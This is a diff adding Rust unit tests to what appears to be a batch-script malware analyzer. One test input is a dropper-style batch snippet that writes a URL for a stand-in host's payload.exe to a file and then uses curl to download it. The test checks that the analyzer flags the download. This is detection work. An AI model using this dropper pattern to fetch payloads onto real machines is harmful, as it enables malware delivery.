@@ -700,6 +700,39 @@ mod echo_tests {
     }
 
     #[test]
+    fn echo_dot_redirect_writes_payload_without_separator() {
+        let report = analyze(
+            br#"echo.https://echo-dot.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#,
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://echo-dot.example/payload.exe" && dst == "payload.exe"
+                )
+            }),
+            "echo. redirected payload did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn redirected_echo_dot_writes_blank_line_not_echo_state() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"echo.>out.txt"#, &mut env);
+        let entry = env.modified_filesystem.get("out.txt").expect("fs");
+        assert!(
+            matches!(entry, FsEntry::Content { content, .. } if content == b"\r\n"),
+            "echo. should write a blank line, got: {:?}",
+            entry
+        );
+    }
+
+    #[test]
     fn redirected_bare_echo_records_current_echo_state_for_for_f() {
         let script = b"@echo off\r\necho>tmp\r\nfor /F \"tokens=3\" %%i in ('type tmp') do if \"%%i\" EQU \"off.\" echo CONTINUE\r\n";
         let report = analyze(script, &AnalyzeConfig::default());
